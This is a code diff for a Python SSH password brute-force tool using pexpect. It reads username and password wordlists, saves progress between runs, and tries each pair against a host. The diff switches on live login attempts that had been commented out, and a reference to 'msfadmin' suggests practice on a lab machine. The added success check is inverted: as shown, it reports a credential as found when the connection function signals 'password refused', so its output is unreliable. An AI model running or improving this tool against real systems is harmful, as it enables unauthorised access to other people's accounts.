@@ -3,7 +3,7 @@
 import sys, pexpect, argparse, os.path
 from os import path
 import itertools
-#from pexpect import pxssh
+from pexpect import pxssh
 
 def check_session():
     try:
@@ -58,6 +58,7 @@ def ssh_connect(host, usr, pwd):
         return 0
     except Exception as e:
         err = str(e)
+        print(err)
         if "password refused" in err:
             return 1
         elif "establish connection" in err:
@@ -97,6 +98,7 @@ def main():
     if rst:
         reset_session()
     
+    done = False
     pos_usr = 1
     pos_pwd = 1
     idx_usr = 0
@@ -119,24 +121,38 @@ def main():
             continue
         else:
             pos_usr = 0
+
         for p in p_f:
             idx_pwd += 1
             if idx_pwd < pos_pwd:
                 continue
             else:
                 pos_pwd = 0
+
             # This is where the attempt is being made
-            print("Trying: ", u.strip() + ":" + p.strip())
-            #print(ssh_connect(host, "msfadmin", "msfadmin1"))
+            tmp_usr = u.strip()
+            tmp_pwd = p.strip()
+            print("Trying: ", tmp_usr + ":" + tmp_pwd)
+            result = ssh_connect(host, tmp_usr, tmp_pwd)
+            if result == 1:
+                print("Successfully found: %s:%s" % (tmp_usr, tmp_pwd))
+                done = True
+                break
+
             if not store_session(idx_usr, idx_pwd):
                 print("Could not save current session.")
                 sys.exit(4)
 
+        if done:
+            break
         p_f.seek(0)
         idx_pwd = 0
 
     u_f.close()
     p_f.close()
+
+    if not done:
+        print("Failed to find username and password combination.")
 
 if __name__ == "__main__":
     try:
